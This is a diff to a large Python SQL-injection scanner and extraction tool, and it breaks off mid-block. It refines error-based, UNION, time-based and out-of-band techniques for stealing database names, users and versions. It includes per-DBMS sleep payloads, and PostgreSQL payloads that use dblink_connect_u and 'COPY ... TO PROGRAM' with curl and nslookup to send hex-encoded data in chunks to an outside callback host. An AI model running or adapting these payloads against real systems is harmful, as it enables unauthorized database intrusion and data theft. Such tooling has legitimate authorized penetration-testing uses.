@@ -57039,16 +57039,45 @@ class Scanner:
             fp = await _send_payload_raw(_p)
             _resp = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
 
-            # Parse value from error message
-                        # Common patterns: value appears between delimiters
-            for _pattern in [
-                r'~([^~]+)~',                     # MySQL extractvalue: ~value~
-                r'invalid input syntax.*?"([^"]+)"',  # PostgreSQL cast error
-                r"Conversion failed.*?value\s+['\"]([^'\"]+)",  # MSSQL
-                r"ORA-\d+.*?['\"]([^'\"]{2,})",    # Oracle
-                r'integer:\s*"([^"]+)"',           # Generic
-                r'cannot be converted.*?"([^"]+)"', # Generic
-            ]:
+            # BUG-E1 FIX (MEDIUM): Pattern list was DBMS-unfiltered and ordered by frequency
+            # rather than specificity.  The generic `r'integer:\s*"([^"]+)"'` (pattern 5)
+            # matched inside PostgreSQL errors like "invalid input syntax for type integer:
+            # \"value\"" before the PostgreSQL-specific `r'invalid input syntax.*?"([^"]+)"'`
+            # (pattern 2) could fire.  Root cause: pattern 5 has no DBMS prefix anchor, so
+            # it fires on any error text containing "integer:"; PostgreSQL cast errors for
+            # integer columns always contain this string.  The same issue affects Oracle
+            # (ORA-01722 "invalid number" → "invalid" in body before "ORA-" trigger).
+            #
+            # Fix: build a DBMS-prioritised pattern list.  Try the DBMS-specific pattern
+            # first (guaranteed to match only for the target DBMS), then fall through to
+            # the remaining patterns as fallbacks for unknown/generic error texts.
+            # The delimiter-truncation flaw (BUG-E2) is orthogonal and not fixed here —
+            # the hex-extraction path (_extract_hex) is the correct remedy for values
+            # containing delimiter characters.
+            _err_dbms_primary = {
+                "MySQL":      r'~([^~]+)~',
+                "MariaDB":    r'~([^~]+)~',
+                "PostgreSQL": r'invalid input syntax[^"]*"([^"]+)"',
+                "CockroachDB":r'invalid input syntax[^"]*"([^"]+)"',
+                "MSSQL":      r"Conversion failed[^'\"]*['\"]([^'\"]+)",
+                "Sybase":     r"Conversion failed[^'\"]*['\"]([^'\"]+)",
+                "Oracle":     r"ORA-\d+[^'\"]*['\"]([^'\"]{2,})",
+                "SQLite":     r'unrecognized token[^"]*"([^"]+)"',
+            }
+            _err_all_patterns = [
+                r'~([^~]+)~',
+                r'invalid input syntax[^"]*"([^"]+)"',
+                r"Conversion failed[^'\"]*['\"]([^'\"]+)",
+                r"ORA-\d+[^'\"]*['\"]([^'\"]{2,})",
+                r'integer:\s*"([^"]+)"',
+                r'cannot be converted[^"]*"([^"]+)"',
+            ]
+            _err_primary = _err_dbms_primary.get(_dbms)
+            _err_ordered = (
+                [_err_primary] + [p for p in _err_all_patterns if p != _err_primary]
+                if _err_primary else _err_all_patterns
+            )
+            for _pattern in _err_ordered:
                 _m = _re.search(_pattern, _resp, _re.I)
                 if _m:
                     _val = _m.group(1)
@@ -58634,7 +58663,16 @@ class Scanner:
                     try:
                         _hv_n = int(_hv)
                         _ht_n = int(_bool_hdr_true or "0")
-                        _hf_n = int(_bool_hdr_false or "0")
+                        # BUG-B2 FIX (HIGH): _bool_hdr_false is None when the response header
+                        # was absent during false calibration (server only sends the header on
+                        # TRUE-condition responses). int(None or "0") = 0 creates a spurious
+                        # gap equal to _ht_n, satisfying _hdr_cal_gap >= _hdr_min_gap and
+                        # forcing the midpoint comparison to return True for every probe →
+                        # entire bit-stream reads True → garbage extraction.
+                        # Guard: skip numeric midpoint comparison when false baseline is unknown.
+                        if _bool_hdr_false is None:
+                            raise ValueError("no false baseline")
+                        _hf_n = int(_bool_hdr_false)
                         _hdr_cal_gap = abs(_ht_n - _hf_n)
                         _hdr_min_gap = max(100, int(max(_ht_n, _hf_n) * 0.02))
                         if _ht_n != _hf_n and _hdr_cal_gap >= _hdr_min_gap:
@@ -59109,7 +59147,16 @@ class Scanner:
                     try:
                         _hv_n = int(_hv)
                         _ht_n = int(_bool_hdr_true or "0")
-                        _hf_n = int(_bool_hdr_false or "0")
+                        # BUG-B2 FIX (HIGH): _bool_hdr_false is None when the response header
+                        # was absent during false calibration (server only sends the header on
+                        # TRUE-condition responses). int(None or "0") = 0 creates a spurious
+                        # gap equal to _ht_n, satisfying _hdr_cal_gap >= _hdr_min_gap and
+                        # forcing the midpoint comparison to return True for every probe →
+                        # entire bit-stream reads True → garbage extraction.
+                        # Guard: skip numeric midpoint comparison when false baseline is unknown.
+                        if _bool_hdr_false is None:
+                            raise ValueError("no false baseline")
+                        _hf_n = int(_bool_hdr_false)
                         _hdr_cal_gap = abs(_ht_n - _hf_n)
                         _hdr_min_gap = max(100, int(max(_ht_n, _hf_n) * 0.02))
                         if _ht_n != _hf_n and _hdr_cal_gap >= _hdr_min_gap:
@@ -61915,7 +61962,31 @@ class Scanner:
                 ("user", "'unknown'"),
                 ("version", "'unknown'")
             ]
-        
+
+        # BUG-U1 FIX (HIGH): Wrap each extraction query in SQRXS/SQRXE sentinel markers.
+        # Without sentinels, the body parser scans for the first non-stop-word alphanumeric
+        # token in the response, which picks up CSS class names, JavaScript identifiers,
+        # and HTML structural words (e.g., "nav", "bootstrap", "angular") that appear in
+        # the page BEFORE the injected DB value — causing garbage extraction results.
+        # Sentinel markers are the same constants used by the UNION detection fast-path
+        # (lines 47810-47811), ensuring both stages use consistent sentinel conventions.
+        # The body parser below checks for SQRXS/SQRXE FIRST before falling through to
+        # the word-scan heuristic (which remains as a fallback when the sentinel is absent,
+        # e.g., when the app strips the sentinel strings or WAF blocks the query variant).
+        _UE_SENT_S = 'SQRXS'
+        _UE_SENT_E = 'SQRXE'
+        if _dbms in ("MySQL", "MariaDB", "TiDB"):
+            def _ue_wrap(e): return f"CONCAT('{_UE_SENT_S}',CAST(({e}) AS CHAR),'{_UE_SENT_E}')"
+        elif _dbms == "MSSQL":
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'+CAST(({e}) AS NVARCHAR(MAX))+'{_UE_SENT_E}'"
+        elif _dbms == "Oracle":
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||TO_CHAR(({e}))||'{_UE_SENT_E}'"
+        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            def _ue_wrap(e): return f"'{_UE_SENT_S}'||CAST(({e}) AS TEXT)||'{_UE_SENT_E}'"
+        else:
+            def _ue_wrap(e): return e  # no sentinel wrapping for unknown DBMS
+        queries_to_extract = [(_lbl, _ue_wrap(_qe)) for _lbl, _qe in queries_to_extract]
+
         # Build NULL padding for unused columns
         null_cols = ",".join(["NULL"] * (col_count - 1)) if col_count > 1 else ""
 
@@ -62151,6 +62222,20 @@ class Scanner:
 
                 value = None
 
+                # BUG-U1 FIX (HIGH, continued): Sentinel detection — HIGHEST PRIORITY.
+                # If the query was wrapped with SQRXS/SQRXE sentinels (above) and the
+                # response contains them, extract the value between the markers directly.
+                # This is immune to web page artifacts (CSS classes, JS libs, HTML tags)
+                # since we search for a specific unique string pattern rather than the
+                # first plausible-looking word. Fall through to the word-scan heuristic
+                # only when sentinels are absent (stripped by app, WAF, or unsupported DBMS).
+                _ue_sent_m = _re.search(r'SQRXS(.*?)SQRXE', body, _re.S)
+                if _ue_sent_m:
+                    _ue_sent_val = _ue_sent_m.group(1).strip()
+                    if _ue_sent_val:
+                        value = _ue_sent_val
+                        LOG.info("[UnionExtract] %s = %r (sentinel-match)", label, value[:60])
+
                 # BUG-UNION-UE-EXTENDED-STOP-SCOPE FIX (Req 7/16):
                 # _SQL_STOP_WORDS and _UE_EXTENDED_STOP were previously defined INSIDE
                 # the `if label == "database":` block (at deeper indentation). When the
@@ -62168,7 +62253,7 @@ class Scanner:
                 # _SQL_STOP_WORDS also moved out of the loop (it was recreated on every
                 # iteration — same value each time — wasting CPU on hot extraction paths).
                 # Strategy A: Database-name (alphanumeric + underscore, 2-64 chars, no HTML words)
-                if label == "database":
+                if value is None and label == "database":
                     for _db_m in _re.finditer(r'\b([a-zA-Z][a-zA-Z0-9_]{1,63})\b', body):
                         _cand = _db_m.group(1)
                         _cand_low = _cand.lower()
@@ -62183,7 +62268,7 @@ class Scanner:
                         value = _cand
                         break
 
-                elif label == "user":
+                elif value is None and label == "user":
                     # user@host, DOMAIN\user, or plain username (3-80 chars)
                     # BUG-UNION-BODY-FINDITER FIX (v59): same finditer approach for user
                     # BUG-V62-USER-STOPWORDS-FIX (LOW, Req 7/16): _SQL_STOP_WORDS is too
@@ -62201,7 +62286,7 @@ class Scanner:
                             value = _ucand
                             break
 
-                elif label == "version":
+                elif value is None and label == "version":
                     # Version number like 8.0.30-commercial or full banner
                     _ver_m = _re.search(r'\b(\d+\.\d+[\d.a-zA-Z\-]*)\b', body)
                     if _ver_m:
@@ -62300,9 +62385,16 @@ class Scanner:
                      "drivers — skipping stacked extraction, falling back to other techniques")
             return False
         elif _dbms == "SQLite":
+            # BUG-D FIX (HIGH): "; SELECT 'admin' as usr" returned the literal string
+            # 'admin' regardless of database state. SQLite has no user/authentication
+            # concept, but fabricating 'admin' makes it appear as a real security finding
+            # (discovered admin account) in the scan report, misleading the tester.
+            # Use 'sqlite_user' as an explicit placeholder (consistent with BUG7-RETRY
+            # which already uses this convention at line 60525) to correctly indicate
+            # that no real user concept exists in SQLite.
             stacked_payloads = [
                 ("; SELECT 'main' as db", "database"),
-                ("; SELECT 'admin' as usr", "user"),
+                ("; SELECT 'sqlite_user' as usr", "user"),
                 ("; SELECT sqlite_version() as ver", "version"),
             ]
         else:
@@ -93501,7 +93593,13 @@ class ZKBooleanExtractor:
     def _sleep_expr(self, dbms: str, t: float) -> str:
         if dbms in ("MySQL", "MariaDB", "TiDB"):
             return f"SLEEP({t:.2f})"
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
+            # BUG-ZK-PG-FAMILY-SLEEP-FIX (CRITICAL): CockroachDB, YugabyteDB, Amazon Redshift,
+            # Greenplum, and DuckDB are all PostgreSQL-wire-compatible and support pg_sleep().
+            # The old code matched only "PostgreSQL", causing the else-branch to return
+            # SLEEP() (MySQL-only) for all PG-family databases → SQL error on every probe →
+            # error-fast response → elapsed_ms≈0 → oracle always False → all bits = 0 →
+            # chr(0) for every extracted character → empty string for all PG-family targets.
             return f"pg_sleep({t:.2f})"
         elif dbms == "MSSQL":
             # BUG-ZK-MSSQL-SLEEP-EXPR FIX: The old template returned
@@ -93519,7 +93617,18 @@ class ZKBooleanExtractor:
             # sys.all_objects typically has 1,000-8,000 rows; a triple cross-join
             # produces O(N^3) work ≈ several seconds, calibrated by _calibrate().
             # This requires no elevated privileges and works in all T-SQL contexts.
-            return "(SELECT COUNT(*) FROM sys.all_objects a CROSS JOIN sys.all_objects b CROSS JOIN (SELECT TOP 10 object_id FROM sys.all_objects) c)"
+            # BUG-ZK-MSSQL-TIMING-CALIBRATION-FIX (HIGH): The original expression used TOP 10
+            # regardless of t. _calibrate() measures baseline RTT and sets self.t_sec, but the
+            # actual cross-join delay is fixed relative to sys.all_objects row count and is
+            # completely decoupled from t. On a server where the cross-join completes in 2s but
+            # the MAD threshold expects 3.25s (t_sec=5), TRUE-condition probes read as FALSE
+            # → all bits = 0 → chr(0) for every character → empty extraction.
+            # Fix: scale TOP N with t so the cross-join delay is proportional to t_sec.
+            # Factor 40 is calibrated for typical SQL Server instances (avg 4000 rows in
+            # sys.all_objects → TOP 200 at t=5 produces ~5s delay via nested-loop joins).
+            _mssql_top = max(10, min(500, int(t * 40)))
+            return (f"(SELECT COUNT(*) FROM sys.all_objects a CROSS JOIN sys.all_objects b"
+                    f" CROSS JOIN (SELECT TOP {_mssql_top} object_id FROM sys.all_objects) c)")
         elif dbms == "Oracle":
             # BUG-ZKE-ORACLE-PIPE-PRIV FIX (LOW, Oracle; ZKBooleanExtractor._sleep_expr,
             # all T/TH/HQ/BT techniques when ZKBooleanExtractor is used as fallback timing engine):
@@ -93560,7 +93669,18 @@ class ZKBooleanExtractor:
             _db2_n = max(10000, int(t * 50000))
             return f"(SELECT COUNT(*) FROM SYSCAT.COLUMNS A,SYSCAT.COLUMNS B FETCH FIRST {_db2_n} ROWS ONLY)"
         elif dbms == "SAP_HANA":
-            return f"SECONDS_BETWEEN(NOW(),ADD_SECONDS(NOW(),{int(t)}))"
+            # BUG-ZK-SAPHANA-SLEEP-FIX (HIGH): SECONDS_BETWEEN(NOW(), ADD_SECONDS(NOW(), N))
+            # is a pure scalar computation — it returns integer N immediately without any
+            # pause. Both the TRUE branch (returning N) and FALSE branch (returning 0) in
+            # CASE WHEN ... THEN <expr> ELSE 0 END complete at identical wall-clock speed,
+            # producing no timing differential → oracle always reads False → empty extraction.
+            # SAP HANA has no SQL-accessible sleep/delay function. Use a heavy Cartesian join
+            # on SYS.TABLES (world-readable system view) as a CPU-bound timing substitute.
+            # Cross-joining SYS.TABLES with itself and a TOP-N-capped subquery produces
+            # O(N²) row combinations proportional to t, causing measurable CPU delay.
+            _hana_top = max(10, min(500, int(t * 80)))
+            return (f"(SELECT COUNT(*) FROM SYS.TABLES A CROSS JOIN SYS.TABLES B"
+                    f" CROSS JOIN (SELECT TOP {_hana_top} TABLE_NAME FROM SYS.TABLES) C)")
         elif dbms == "ClickHouse":
             # BUG-ZK-CLICKHOUSE-SLEEP-FIX (MEDIUM; ClickHouse; ZKBooleanExtractor._sleep_expr):
             # SECONDS_BETWEEN() and ADD_SECONDS() are SAP HANA functions — they do NOT
@@ -99998,6 +100118,16 @@ class WAFBlockDiscriminator:
         if sc == 429:
             return False  # rate-limit is not a WAF block; asymmetric 429 is a real injection signal
         if sc in cls.WAF_BLOCK_CODES:
+            # BUG-W1 FIX (HIGH): 503 Service Unavailable can be a genuine injection signal —
+            # e.g., the TRUE SQL branch causes a database timeout or error that the app translates
+            # to HTTP 503, while the FALSE branch returns 200. Treating 503 as WAF block by
+            # status code alone discards valid detection signals in single-probe contexts
+            # (detect_time, detect_stacked, detect_error). Unlike 403/406/412 which are explicit
+            # WAF block indicators, 503 is an infrastructure error code used by load balancers,
+            # app servers, and WAFs alike. Require body pattern match for 503 (same guard as
+            # is_waf_block) so genuine backend errors don't suppress real injection signals.
+            if sc == 503:
+                return cls.is_waf_block(fp)
             return True
         return cls.is_waf_block(fp)
 
@@ -105918,57 +106048,37 @@ class TechniqueCascadeEngine:
         )
         if (_mp_confirmed_early and _mp_count_early >= 4 and not _mp_bool_early
                 and det is not None and _early_b_has_timing):
-            _early_tech_b = getattr(det, 'technique', tech) or tech
-            _early_dbms_b = getattr(det, 'dbms', dbms) or dbms
-            print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech_b}] {_early_dbms_b} "
-                  f"(timing multi-probe early: {_mp_count_early}/5 probes slow) "
-                  "— starting extraction", flush=True)
-            _INJECTION_CONFIRMED[0] = True
-            _SCAN_STOPPED[0] = True
-            _cev_eb = (getattr(self, '_confirmed_event', None) or
-                       getattr(getattr(self, 'config', None), '_confirmed_event', None))
-            if _cev_eb:
-                # BUG-V197-BG-RESULT FIX (Bug 3 — THIS IS THE EXACT SHORTCUT THAT FIRED
-                # IN THE LOG):  Shortcut B fires for timing multi-probe (5/5 probes slow).
-                # The BG header scan confirmed PostgreSQL T on X-Forwarded-For via this path.
-                # It called _cev_eb.set() but never stored the DetectionResult anywhere.
-                # The main scanner's run loop then:
-                #   1. Saw _confirm_waiter done → cancelled primary task → orch_result=None
-                #   2. result = orch_result[0].detection if orch_result else None  → None
-                #   3. Background task already cancelled → confirmed=[], _bg_confirmed_results=[]
-                #   4. Failsafe: _injection_confirmed._bg_result is None → result stays None
-                #   5. "if result:" is False → "Starting extraction" message never printed
-                #   6. Scan completes with 0 extracted data
-                # Fix: write det to _cev_eb._bg_result BEFORE calling set() so the failsafe
-                # can read the DetectionResult even after the BG task has been cancelled.
-                # This is safe: the attribute assignment is a plain Python object store with
-                # no SQL interaction; _bg_result is only read after _injection_confirmed.is_set()
-                # confirms it was written.
+            # BUG-PCVSHORTB-EARLY FIX (CRITICAL): Early Shortcut B was confirming timing
+            # injection when 4+/5 multi-probes are slow WITHOUT validating the FALSE
+            # condition is fast.  Two false-positive paths:
+            #   1. CDN-lock: CDN caches slow response → all probes return cached slow value.
+            #   2. Slow server: baseline already slow, CDN-cold injection probes all exceed
+            #      threshold without any SLEEP actually executing.
+            #
+            # The equivalent shortcut in _pcv_check_guarded (lines ~107010-107020) was
+            # ALREADY FIXED by routing through Check B canary pairs (proportional half-sleep
+            # vs double-sleep probes that directly compare True vs False timing differential).
+            # However, _inline_pcv_check's Early Shortcut B (here) was never updated —
+            # it still fired immediately and returned True with no canary validation.
+            # Root cause of production false positive: BG header scan used _inline_pcv_check
+            # directly; 5/5 probes slow at threshold=440ms (CDN jitter, not injection) →
+            # Early Shortcut B confirmed → extraction produced garbage ("sus", "aptnunan...").
+            #
+            # Fix: apply the same FP prevention here.  Disable the shortcut for timing
+            # techniques by setting _skip_pcv_timing_shortcut=True and falling through to
+            # the mechanism-sniffing block and Check B proportional canary pairs.
+            # The 2 extra HTTP probes for timing canaries are worth eliminating FPs.
+            # Note: _pcv_check_guarded already incremented _PCV_IN_PROGRESS before calling
+            # us, so the gate at ~105973 (which checks _PCV_IN_PROGRESS > 0) will pass.
+            if not getattr(det, '_skip_pcv_timing_shortcut', False):
                 try:
-                    _cev_eb._bg_result = det
+                    det._skip_pcv_timing_shortcut = True
                 except Exception:
                     pass
-                if not _cev_eb.is_set():
-                    _cev_eb.set()
-            _gate_eb = getattr(self, '_gate', None)
-            if _gate_eb and not getattr(_gate_eb, 'killed', True):
-                try: _gate_eb.kill()
-                except Exception: pass
-            try:
-                det._pcv_verified = True
-                if hasattr(det, 'detection') and det.detection is not None:
-                    det.detection._pcv_verified = True
-            except Exception:
-                pass
-            # BUG-V55-CAST-VOTE-FIX (Req 15): Wire _cast_vote for timing multi-probe path.
-            try:
-                _eb_det_param = getattr(det, 'param', param) or param
-                _eb_det_tech  = getattr(det, 'technique', tech) or tech
-                # PCV Shortcut B (timing multi-probe confirmed) — always vote 1.0
-                self._cast_vote(_eb_det_param, _eb_det_tech, 1.0)
-            except Exception:
-                pass
-            return True
+                LOG.info("[PCV] Early Shortcut B: routing timing multi-probe (%d/5 slow) "
+                         "through Check B canary pairs (FP prevention — "
+                         "CDN-lock/slow-server guard)", _mp_count_early)
+                # ↓ fall through to Check B — do NOT confirm here ↓
 
         # ── Original scan-stop gate (applies to probe-sending paths only) ─────────────
         # FIX-12A (ROOT CAUSE - "hit found but never escalated to SQLI"):
@@ -137794,50 +137904,66 @@ class SideChannelExtractor:
                 # Single-quote with doubled-quote escaping (works for MySQL/MSSQL/Oracle/etc)
                 return "'" + s.replace("'", "''") + "'"
         _methods = []
-        if self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-            # PostgreSQL hex: encode(expr::bytea, 'hex')
-            # FIX-OOB-DNS-LABEL-LIMIT: RFC 1035 caps DNS labels at 63 chars.
-            # Hex-encoding doubles byte count, so >31 bytes produces an over-length
-            # label that resolvers silently reject.  Truncate to 31 bytes at SQL level.
-            _hex = "encode((SUBSTRING((" + expr + "),1,31))::bytea,$$hex$$)"  # BUG-PGSQL-HEX-FSTRING FIX
+        # BUG-OOB1 FIX (HIGH): chunked DNS exfiltration for PostgreSQL-family DBMSes.
+        # RFC 1035 §2.3.4 caps each DNS label at 63 octets. Hex-encoding doubles the
+        # byte count, so SUBSTRING(expr, 1, 31) produces at most 62 hex chars (just
+        # under the limit). Values > 31 bytes (database version strings, long table names)
+        # were silently truncated with no warning or retry — the caller received a
+        # partial result indistinguishable from a complete one.
+        #
+        # Fix: prepend a 2-char hex chunk-index to each DNS label (occupying 2 of the
+        # 63 available chars), leaving 61 chars for data = 30 bytes per chunk.
+        # Four chunks cover 120 bytes — sufficient for any DB name, username, or version.
+        # Chunk indices 00-03 map to chunk 0-3. All valid UTF-8 DB identifiers start with
+        # a printable ASCII byte (≥0x20='20'), so 00-03 prefixes are unambiguous.
+        # MySQL, MSSQL, and Oracle still use the original 31-byte single-chunk approach
+        # (their DNS exfil paths are structurally different and rarely return > 31 bytes
+        # for the specific fields extracted here).
+        _OOB_PG_CHUNK_SIZE = 30   # bytes per chunk (leaves 2 chars for chunk index)
+        _OOB_PG_MAX_CHUNKS = 4    # 4 × 30 = 120 bytes max
+        _chunked_oob = self.dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+        if _chunked_oob:
             # BUG-PGSQL-NONSTACK-EXFIL FIX: For non-stacked detections (B/E/T),
             # self._prefix = "'  " so "{prefix}SELECT dblink_connect_u(...)" becomes
             # "'  SELECT dblink_connect_u(...)" — INVALID SQL in a WHERE clause.
-            # The detection itself used AND (SELECT dblink_connect(...))-style which
-            # IS valid inline. Extraction must use the same AND (SELECT ...) wrapper
-            # for non-stacked contexts. For stacked (self._stacked=True), use the
-            # plain SELECT form (preceded by semicolon in the prefix).
-            _conn_str = f"$$host=$$ || {_hex} || $$.{_cb} dbname=x connect_timeout=3$$"
+            # Fix: use AND (SELECT ...) wrapper for non-stacked, plain SELECT for stacked.
+            #
+            # BUG-OOB1 FIX: Each chunk method DNS label = LPAD(TO_HEX(N),2,'0') || hex_data
+            # (2 + 60 chars = 62 ≤ 63 DNS label limit). All methods use chunk-indexed labels
+            # so the poll loop can assemble all chunks by their 2-char index prefix.
+            for _pg_ci in range(_OOB_PG_MAX_CHUNKS):
+                _pg_off = _pg_ci * _OOB_PG_CHUNK_SIZE + 1
+                _hex_ci = (f"LPAD(TO_HEX({_pg_ci}),2,$$0$$)||"
+                           f"encode((SUBSTRING(({expr}),{_pg_off},{_OOB_PG_CHUNK_SIZE}))::bytea,$$hex$$)")
+                _conn_ci = f"$$host=$$ || {_hex_ci} || $$.{_cb} dbname=x connect_timeout=3$$"
+                if self._stacked:
+                    _pld_u_ci = f"{self._prefix}SELECT dblink_connect_u({_conn_ci}){self._suffix}"
+                else:
+                    _pld_u_ci = f"{self._prefix}AND (SELECT dblink_connect_u({_conn_ci})) IS NOT NULL{self._suffix}"
+                _methods.append((f"dblink_u_c{_pg_ci}", _pld_u_ci,
+                                 f"dblink_connect_u DNS chunk {_pg_ci} "
+                                 f"(bytes {_pg_off}-{_pg_off + _OOB_PG_CHUNK_SIZE - 1})"))
+            # dblink fallback uses chunk-0 format (requires dblink extension)
+            _hex_c0 = (f"LPAD(TO_HEX(0),2,$$0$$)||"
+                       f"encode((SUBSTRING(({expr}),1,{_OOB_PG_CHUNK_SIZE}))::bytea,$$hex$$)")
+            _conn_c0 = f"$$host=$$ || {_hex_c0} || $$.{_cb} dbname=x connect_timeout=3$$"
             if self._stacked:
-                _pg_dblink_u = f"{self._prefix}SELECT dblink_connect_u({_conn_str}){self._suffix}"
-                _pg_dblink   = f"{self._prefix}SELECT dblink_connect({_conn_str}){self._suffix}"
-                _pg_copy_c   = f"{self._prefix}COPY (SELECT {_hex}) TO PROGRAM $$xargs -I{{}} curl http://{{}}.{_cb}$${self._suffix}"
-                _pg_copy_n   = f"{self._prefix}COPY (SELECT {_hex}) TO PROGRAM $$xargs -I{{}} nslookup {{}}.{_cb}$${self._suffix}"
-                _pg_notify   = f"{self._prefix}SELECT pg_notify($$oob$$, {_hex}){self._suffix}"
+                _methods.append(("dblink_c0",
+                                 f"{self._prefix}SELECT dblink_connect({_conn_c0}){self._suffix}",
+                                 "dblink_connect DNS chunk 0 fallback (needs dblink extension)"))
+                # COPY-based methods are stacked-only and exfiltrate chunk 0 via shell
+                _methods.append(("copy_curl",
+                                 f"{self._prefix}COPY (SELECT {_hex_c0}) TO PROGRAM "
+                                 f"$$xargs -I{{}} curl http://{{}}.{_cb}$${self._suffix}",
+                                 "COPY+curl HTTP exfil chunk 0 (superuser only)"))
+                _methods.append(("copy_nslookup",
+                                 f"{self._prefix}COPY (SELECT {_hex_c0}) TO PROGRAM "
+                                 f"$$xargs -I{{}} nslookup {{}}.{_cb}$${self._suffix}",
+                                 "COPY+nslookup DNS chunk 0 (superuser only)"))
             else:
-                # Inline AND (SELECT ...) wrapper — mirrors the detection payload style
-                _pg_dblink_u = f"{self._prefix}AND (SELECT dblink_connect_u({_conn_str})) IS NOT NULL{self._suffix}"
-                _pg_dblink   = f"{self._prefix}AND (SELECT dblink_connect({_conn_str})) IS NOT NULL{self._suffix}"
-                # COPY-based methods require stacked-query context (semicolon separator).
-                # In non-stacked context there is no real payload to send; skip them
-                # entirely rather than sending a dummy AND 1=1 that never exfiltrates.
-                _pg_copy_c   = None  # populated only when self._stacked is True
-                _pg_copy_n   = None
-                _pg_notify   = f"{self._prefix}AND (SELECT pg_notify($$oob$$, {_hex})) IS NOT NULL{self._suffix}"
-            # FIX-OOB-NONSTACKED-DUMMY: COPY needs stacked-query context.  When not
-            # stacked, the payload was "AND 1=1" — a no-op that never exfiltrates data
-            # but still triggers a DNS-poll attempt (wasting time, no callback arrives).
-            # Now _pg_copy_c/_pg_copy_n are None in non-stacked mode; filter them out.
-            # FIX-OOB-PG-NOTIFY: pg_notify sends a local PostgreSQL LISTEN/NOTIFY event
-            # within the DB cluster only — no network connection, no DNS lookup, no OAST
-            # interaction possible under any circumstances.  Removed from OOB methods.
-            _methods = [
-                ("dblink_u",     _pg_dblink_u, "dblink_connect_u DNS (no extension needed)"),
-                ("dblink",       _pg_dblink,   "dblink_connect DNS (needs dblink extension)"),
-            ]
-            if self._stacked and _pg_copy_c is not None:
-                _methods.insert(2, ("copy_curl",     _pg_copy_c, "COPY+curl HTTP exfil (superuser only)"))
-                _methods.insert(3, ("copy_nslookup", _pg_copy_n, "COPY+nslookup DNS (superuser only)"))
+                _methods.append(("dblink_c0",
+                                 f"{self._prefix}AND (SELECT dblink_connect({_conn_c0})) IS NOT NULL{self._suffix}",
+                                 "dblink_connect DNS chunk 0 fallback (needs dblink extension)"))
         elif self.dbms in ("MySQL", "MariaDB"):
             # BUG-DNS-EXFIL-NONSTACK-CONTEXT FIX: For non-stacked detections (B/E/T),
             # self._prefix = "' " (boolean context), so
@@ -138003,6 +138129,7 @@ class SideChannelExtractor:
         _oob_token = getattr(self.config, "oob_token", "") or ""
         _extracted = ""
         _oob_reachable = False  # did ANY callback arrive (even base-domain only)?
+        _received_chunks = {}   # BUG-OOB1 FIX: chunk_idx → bytes, for PG chunked extraction
         # BUG-ANY-NON-BLOCKED FIX: DNS lookup fires BEFORE TCP connection attempt.
         # Even if the app returns 500 quickly (dblink ECONNREFUSED <100ms),
         # the DNS callback is already at the OAST server. Poll regardless.
@@ -138103,22 +138230,65 @@ class SideChannelExtractor:
                                     # (sqrXXXXXXXXXXXX) contain non-hex chars (s,r,g,q) and always
                                     # fail the all(c in "0123456789abcdef") check anyway.
                                     # Fix: remove self.token — the hex validation is sufficient.
+                                    _hex_part_low = _hex_part.lower()
                                     if (len(_hex_part) > 4 and
-                                            all(c in "0123456789abcdef" for c in _hex_part.lower())):
-                                        try:
-                                            _extracted = bytes.fromhex(_hex_part.lower()).decode("utf-8", errors="replace")
-                                            print(f"[SideChannel]  OOB callback received! Data: {_extracted[:60]}", flush=True)
-                                            return _extracted
-                                        except (ValueError, UnicodeDecodeError):
-                                            _extracted = _hex_part
-                                            print(f"[SideChannel]  OOB callback received! Hex: {_hex_part[:60]}", flush=True)
-                                            return _extracted
+                                            all(c in "0123456789abcdef" for c in _hex_part_low)):
+                                        # BUG-OOB1 FIX: detect chunk-indexed labels (prefix 00-03).
+                                        # All valid UTF-8 DB identifiers start with a printable byte
+                                        # (≥0x20), so prefixes 00-03 are unambiguous chunk markers.
+                                        _pfx2 = _hex_part_low[:2]
+                                        if (_chunked_oob and len(_hex_part) >= 6
+                                                and _pfx2 in ('00', '01', '02', '03')):
+                                            try:
+                                                _ci_recv = int(_pfx2, 16)
+                                                _chunk_bytes = bytes.fromhex(_hex_part_low[2:])
+                                                _received_chunks[_ci_recv] = _chunk_bytes
+                                                print(f"[SideChannel]  OOB chunk {_ci_recv} received: "
+                                                      f"{len(_chunk_bytes)} bytes", flush=True)
+                                                # Assemble when we have a contiguous run ending in a
+                                                # short chunk (< chunk_size bytes = last chunk).
+                                                _max_ci = max(_received_chunks)
+                                                _have_all = all(_i in _received_chunks
+                                                                for _i in range(_max_ci + 1))
+                                                _last_short = len(_received_chunks[_max_ci]) < _OOB_PG_CHUNK_SIZE
+                                                if _have_all and _last_short:
+                                                    _assembled = b"".join(
+                                                        _received_chunks[_i]
+                                                        for _i in range(_max_ci + 1))
+                                                    _extracted = _assembled.decode("utf-8", errors="replace")
+                                                    print(f"[SideChannel]  OOB assembled ({_max_ci + 1} chunks): "
+                                                          f"{_extracted[:60]}", flush=True)
+                                                    return _extracted
+                                            except (ValueError, KeyError):
+                                                pass
+                                        else:
+                                            # Non-chunked hex callback (MySQL, MSSQL, Oracle, or
+                                            # single-chunk legacy callback from copy/other methods)
+                                            try:
+                                                _extracted = bytes.fromhex(_hex_part_low).decode("utf-8", errors="replace")
+                                                print(f"[SideChannel]  OOB callback received! Data: {_extracted[:60]}", flush=True)
+                                                return _extracted
+                                            except (ValueError, UnicodeDecodeError):
+                                                _extracted = _hex_part
+                                                print(f"[SideChannel]  OOB callback received! Hex: {_hex_part[:60]}", flush=True)
+                                                return _extracted
                                     else:
                                         # Base-domain callback: OOB reachable but data not encoded
                                         # (WAF blocked the data-encoding SQL; connectivity test worked)
                                         print(f"[SideChannel]  OOB DNS reachable (base domain, {_proto})! WAF likely blocked data-encoding SQL.", flush=True)
                                         # Don't return yet — continue polling in case a data callback arrives
                         if _oob_reachable and time.monotonic() > _deadline - 5:
+                            # BUG-OOB1 FIX: At deadline, assemble any partial chunks received
+                            # (e.g., value is exactly 30 bytes — chunk 0 full, chunk 1 never fires).
+                            if _received_chunks and not _extracted:
